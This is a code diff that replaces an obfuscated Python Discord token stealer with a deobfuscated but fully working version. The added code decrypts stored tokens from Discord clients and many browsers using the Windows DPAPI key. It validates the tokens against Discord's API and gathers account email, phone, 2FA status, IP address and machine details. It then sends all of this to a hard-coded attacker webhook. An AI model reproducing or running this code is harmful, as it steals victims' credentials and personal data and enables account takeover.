@@ -1,112 +1,129 @@
-lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl = IndexError, abs, __name__, open, bool, len, PermissionError
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from os import getlogin, listdir
+from json import loads
+from re import findall
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+import requests, json, os
+from datetime import datetime
 
-from base64 import b64decode as IIlIlIllIIIlII
-from Crypto.Cipher import AES as lIlIIIIlIIllII
-from win32crypt import CryptUnprotectData as IIIIlllIlIIlll
-from os import getlogin as IlIIIllIllIlll, listdir as IllllIlIlIIIIl
-from json import loads as IlIllllIIIlIlI
-from re import findall as IIlIIllIlIlllI
-from urllib.request import Request as IlIlllIIlIllIl, urlopen as llllIlllllIIII
-from subprocess import Popen as llIllIllllIlII, PIPE as IlIlIIIlIllIIl
-import requests as lIlIlIIlIIIIII, json as IllllIlIIlIlII, os as llIIIIllllIIlI
-from datetime import datetime as IllllIIlIlIllI
-IIlIIllIIlIllIllll = []
-lllIlIlIlllIlIlIlI = []
-lllIllIIlIlllIllII = []
+tokens = []
+cleaned = []
+checker = []
 
-def lIIlIlIlIIIIIlIIll(IlllIllIIlIIIIIIII, IlIIIIIlIIIIIIIIII):
+def decrypt(buff, master_key):
     try:
-        return lIlIIIIlIIllII.new(IIIIlllIlIIlll(IlIIIIIlIIIIIIIIII, None, None, None, 0)[1], lIlIIIIlIIllII.MODE_GCM, IlllIllIIlIIIIIIII[3:15]).lIIlIlIlIIIIIlIIll(IlllIllIIlIIIIIIII[15:])[:-16].decode()
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except:
-        return 'Error'
-
-def IlIlllIIlIlllllIlI():
-    IIIllIIIlIlllIIIIl = 'None'
+        return "Error"
+def getip():
+    ip = "None"
     try:
-        IIIllIIIlIlllIIIIl = llllIlllllIIII(IlIlllIIlIllIl('https://api.ipify.org')).read().decode().strip()
-    except:
-        pass
-    return IIIllIIIlIlllIIIIl
-
-def lIIIIllllIIIllIllI():
-    llIlllIlIlIIIlIIIl = llIllIllllIlII('wmic csproduct get uuid', shell=True, stdin=IlIlIIIlIllIIl, stdout=IlIlIIIlIllIIl, stderr=IlIlIIIlIllIIl)
-    return (llIlllIlIlIIIlIIIl.stdout.read() + llIlllIlIlIIIlIIIl.stderr.read()).decode().split('\n')[1]
-
-def lIlIlIIlIIllIIIIll():
-    lIIlIlIIIlIIllllII = []
-    lllIllIIlIlllIllII = []
-    llIIlIlIIlllIIllIl = llIIIIllllIIlI.getenv('LOCALAPPDATA')
-    lIlIIIIIIlllIlIlIl = llIIIIllllIIlI.getenv('APPDATA')
-    llllIIIlIlIIllIIlI = llIIlIlIIlllIIllIl + '\\Google\\Chrome\\User Data'
-    lIllIlIIIIIIIIlIlI = {'Discord': lIlIIIIIIlllIlIlIl + '\\discord', 'Discord Canary': lIlIIIIIIlllIlIlIl + '\\discordcanary', 'Lightcord': lIlIIIIIIlllIlIlIl + '\\Lightcord', 'Discord PTB': lIlIIIIIIlllIlIlIl + '\\discordptb', 'Opera': lIlIIIIIIlllIlIlIl + '\\Opera Software\\Opera Stable', 'Opera GX': lIlIIIIIIlllIlIlIl + '\\Opera Software\\Opera GX Stable', 'Amigo': llIIlIlIIlllIIllIl + '\\Amigo\\User Data', 'Torch': llIIlIlIIlllIIllIl + '\\Torch\\User Data', 'Kometa': llIIlIlIIlllIIllIl + '\\Kometa\\User Data', 'Orbitum': llIIlIlIIlllIIllIl + '\\Orbitum\\User Data', 'CentBrowser': llIIlIlIIlllIIllIl + '\\CentBrowser\\User Data', '7Star': llIIlIlIIlllIIllIl + '\\7Star\\7Star\\User Data', 'Sputnik': llIIlIlIIlllIIllIl + '\\Sputnik\\Sputnik\\User Data', 'Vivaldi': llIIlIlIIlllIIllIl + '\\Vivaldi\\User Data\\Default', 'Chrome SxS': llIIlIlIIlllIIllIl + '\\Google\\Chrome SxS\\User Data', 'Chrome': llllIIIlIlIIllIIlI + 'Default', 'Epic Privacy Browser': llIIlIlIIlllIIllIl + '\\Epic Privacy Browser\\User Data', 'Microsoft Edge': llIIlIlIIlllIIllIl + '\\Microsoft\\Edge\\User Data\\Defaul', 'Uran': llIIlIlIIlllIIllIl + '\\uCozMedia\\Uran\\User Data\\Default', 'Yandex': llIIlIlIIlllIIllIl + '\\Yandex\\YandexBrowser\\User Data\\Default', 'Brave': llIIlIlIIlllIIllIl + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Iridium': llIIlIlIIlllIIllIl + '\\Iridium\\User Data\\Default'}
-    for (lIllIlllIlllIlIllI, IlIlllllIllllIIlll) in lIllIlIIIIIIIIlIlI.items():
-        if not llIIIIllllIIlI.IlIlllllIllllIIlll.exists(IlIlllllIllllIIlll):
-            continue
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except: pass
+    return ip
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def get_token():
+    already_check = []
+    checker = []
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    chrome = local + "\\Google\\Chrome\\User Data"
+    paths = {
+        'Discord': roaming + '\\discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Lightcord': roaming + '\\Lightcord',
+        'Discord PTB': roaming + '\\discordptb',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+        'Amigo': local + '\\Amigo\\User Data',
+        'Torch': local + '\\Torch\\User Data',
+        'Kometa': local + '\\Kometa\\User Data',
+        'Orbitum': local + '\\Orbitum\\User Data',
+        'CentBrowser': local + '\\CentBrowser\\User Data',
+        '7Star': local + '\\7Star\\7Star\\User Data',
+        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': chrome + 'Default',
+        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
+        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Iridium': local + '\\Iridium\\User Data\\Default'
+    }
+    for platform, path in paths.items():
+        if not os.path.exists(path): continue
         try:
-            with lllllllllllllII(IlIlllllIllllIIlll + f'\\Local State', 'r') as IlIlIIlIlIlIIlllII:
-                lllIlIIIIllIIlIIlI = IlIllllIIIlIlI(IlIlIIlIlIlIIlllII.read())['os_crypt']['encrypted_key']
-                IlIlIIlIlIlIIlllII.close()
-        except:
-            continue
-        for IlIlIIlIlIlIIlllII in IllllIlIlIIIIl(IlIlllllIllllIIlll + f'\\Local Storage\\leveldb\\'):
-            if not IlIlIIlIlIlIIlllII.endswith('.ldb') and IlIlIIlIlIlIIlllII.endswith('.log'):
-                continue
+            with open(path + f"\\Local State", "r") as file:
+                key = loads(file.read())['os_crypt']['encrypted_key']
+                file.close()
+        except: continue
+        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
+            if not file.endswith(".ldb") and file.endswith(".log"): continue
             else:
                 try:
-                    with lllllllllllllII(IlIlllllIllllIIlll + f'\\Local Storage\\leveldb\\{IlIlIIlIlIlIIlllII}', 'r', errors='ignore') as IllIIlIlIllIIIIlll:
-                        for IIIIllIIllIlIIIlll in IllIIlIlIllIIIIlll.readlines():
-                            IIIIllIIllIlIIIlll.strip()
-                            for lIlIlIIIIlIlIIlIll in IIlIIllIlIlllI('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*', IIIIllIIllIlIIIlll):
-                                IIlIIllIIlIllIllll.append(lIlIlIIIIlIlIIlIll)
-                except llllllllllllIIl:
-                    continue
-        for lllIIlllIlIIlllIll in IIlIIllIIlIllIllll:
-            if lllIIlllIlIIlllIll.endswith('\\'):
-                lllIIlllIlIIlllIll.replace('\\', '')
-            elif lllIIlllIlIIlllIll not in lllIlIlIlllIlIlIlI:
-                lllIlIlIlllIlIlIlI.append(lllIIlllIlIIlllIll)
-        for llIIIIlIIIIlIllIll in lllIlIlIlllIlIlIlI:
+                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError: continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
             try:
-                IlllIIIIlIlIlllIll = lIIlIlIlIIIIIlIIll(IIlIlIllIIIlII(llIIIIlIIIIlIllIll.split('dQw4w9WgXcQ:')[1]), IIlIlIllIIIlII(lllIlIIIIllIIlIIlI)[5:])
-            except lllllllllllllll == 'Error':
-                continue
-            lllIllIIlIlllIllII.append(IlllIIIIlIlIlllIll)
-            for lllIllIIIlIIlIIIII in lllIllIIlIlllIllII:
-                if lllIllIIIlIIlIIIII not in lIIlIlIIIlIIllllII:
-                    lIIlIlIIIlIIllllII.append(lllIllIIIlIIlIIIII)
-                    lIlIIlllIlIlIIIlII = {'Authorization': IlllIIIIlIlIlllIll, 'Content-Type': 'application/json'}
+                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+            except IndexError == "Error": continue
+            checker.append(tok)
+            for value in checker:
+                if value not in already_check:
+                    already_check.append(value)
+                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                     try:
-                        IIlIlIIIIllIlllIlI = lIlIlIIlIIIIII.get('https://discordapp.com/api/v6/users/@me', headers=lIlIIlllIlIlIIIlII)
-                    except:
-                        continue
-                    if IIlIlIIIIllIlllIlI.status_code == 200:
-                        IIllIIIlIllllIllII = IIlIlIIIIllIlllIlI.json()
-                        IIIllIIIlIlllIIIIl = IlIlllIIlIlllllIlI()
-                        IIIlIIllllIllllIlI = llIIIIllllIIlI.getenv('UserName')
-                        IllIIlIIIIIllIlIlI = llIIIIllllIIlI.getenv('COMPUTERNAME')
-                        IlllllllIIIlIlIlII = f"{IIllIIIlIllllIllII['username']}#{IIllIIIlIllllIllII['discriminator']}"
-                        IlIlIIlIllIlIIIIIl = IIllIIIlIllllIllII['id']
-                        llIllllIllIlIlIIll = IIllIIIlIllllIllII['email']
-                        llllllllllllllIIlI = IIllIIIlIllllIllII['phone']
-                        IlIIlIllIIlIIIIlIl = IIllIIIlIllllIllII['mfa_enabled']
-                        IllllIllIIIlllIIII = False
-                        IIlIlIIIIllIlllIlI = lIlIlIIlIIIIII.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=lIlIIlllIlIlIIIlII)
-                        lIlIlIlllllIIIllII = IIlIlIIIIllIlllIlI.json()
-                        IllllIllIIIlllIIII = llllllllllllIll(llllllllllllIlI(lIlIlIlllllIIIllII) > 0)
-                        IIIIlIllIIlIllIIII = 0
-                        if IllllIllIIIlllIIII:
-                            IllIllIIlllllllllI = IllllIIlIlIllI.strptime(lIlIlIlllllIIIllII[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
-                            llIlIIllIIIlIlIIlI = IllllIIlIlIllI.strptime(lIlIlIlllllIIIllII[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
-                            IIIIlIllIIlIllIIII = llllllllllllllI((llIlIIllIIIlIlIIlI - IllIllIIlllllllllI).days)
-                        lllIIIIlIllllllIlI = f"**{IlllllllIIIlIlIlII}** *({IlIlIIlIllIlIIIIIl})*\n\n> :dividers: __Account Information__\n\tEmail: `{llIllllIllIlIlIIll}`\n\tPhone: `{llllllllllllllIIlI}`\n\t2FA/MFA Enabled: `{IlIIlIllIIlIIIIlIl}`\n\tNitro: `{IllllIllIIIlllIIII}`\n\tExpires in: `{(IIIIlIllIIlIllIIII if IIIIlIllIIlIllIIII else 'None')} day(s)`\n\n> :computer: __PC Information__\n\tIP: `{IIIllIIIlIlllIIIIl}`\n\tUsername: `{IIIlIIllllIllllIlI}`\n\tPC Name: `{IllIIlIIIIIllIlIlI}`\n\tPlatform: `{lIllIlllIlllIlIllI}`\n\n> :piñata: __Token__\n\t`{IlllIIIIlIlIlllIll}`\n\nuwu"
-                        llllIlIlIIIlIIllII = IllllIlIIlIlII.dumps({'content': lllIIIIlIllllllIlI, 'username': 'uwu', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+                    except: continue
+                    if res.status_code == 200:
+                        res_json = res.json()
+                        ip = getip()
+                        pc_username = os.getenv("UserName")
+                        pc_name = os.getenv("COMPUTERNAME")
+                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                        user_id = res_json['id']
+                        email = res_json['email']
+                        phone = res_json['phone']
+                        mfa_enabled = res_json['mfa_enabled']
+                        has_nitro = False
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+                        nitro_data = res.json()
+                        has_nitro = bool(len(nitro_data) > 0)
+                        days_left = 0
+                        if has_nitro:
+                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            days_left = abs((d2 - d1).days)
+                        embed = f"""**{user_name}** *({user_id})*\n
+> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
+> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
+> :piñata: __Token__\n\t`{tok}`\n
+uwu"""
+                        payload = json.dumps({'content': embed, 'username': 'uwu', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                         try:
-                            llllIIIIIIlIlIlllI = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
-                            lIlllIIlIlllIlIIlI = IlIlllIIlIllIl('https://discord.com/api/webhooks/1262040206702284941/6Id-v5cU-rE9UQYKU_wpwYxeNZKJB3XoBt51aTEfG29tZF_MgU8759wTPYoIxijUZhLU', data=llllIlIlIIIlIIllII.encode(), headers=llllIIIIIIlIlIlllI)
-                            llllIlllllIIII(lIlllIIlIlllIlIIlI)
-                        except:
-                            continue
-                else:
-                    continue
-if lllllllllllllIl == '__main__':
-    lIlIlIIlIIllIIIIll()
+                            headers2 = {
+                                'Content-Type': 'application/json',
+                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+                            }
+                            req = Request('https://discord.com/api/webhooks/1262040206702284941/6Id-v5cU-rE9UQYKU_wpwYxeNZKJB3XoBt51aTEfG29tZF_MgU8759wTPYoIxijUZhLU', data=payload.encode(), headers=headers2)
+                            urlopen(req)
+                        except: continue
+                else: continue
+if __name__ == '__main__':
+    get_token()
